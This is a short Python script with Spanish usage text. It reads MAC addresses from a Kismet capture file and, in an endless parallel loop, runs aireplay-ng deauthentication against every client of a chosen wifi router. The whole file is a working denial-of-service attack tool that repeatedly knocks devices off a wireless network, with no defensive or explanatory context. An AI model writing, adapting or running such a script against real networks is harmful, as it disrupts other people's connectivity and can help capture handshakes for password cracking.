#!/usr/bin/env python3.5
import re
from subprocess import call
from sys import argv
from joblib import Parallel, delayed
import multiprocessing


if len(argv) != 3:
	print("ejecutable \"MAC_router\" \"XXXX-XX.kismet.netxml\"")
	raise SystemExit

n_cpu = multiprocessing.cpu_count()
basura, bssid, archivo = argv

if not ".kismet.netxml" in archivo:
	archivo += ".kismet.netxml"

def aireplay(x):
	if x != bssid:
		call(["aireplay-ng", "-0", "1", "-a", bssid, "-c", x, "wlan0mon"])
		

while True:
	mac = list()
	fd = open(archivo, 'r')
	mac = re.findall("(\w\w:\w\w:\w\w:\w\w:\w\w:\w\w)", fd.read())
	fd.close()
	Parallel(n_jobs=n_cpu)(delayed(aireplay)(i) for i in mac)
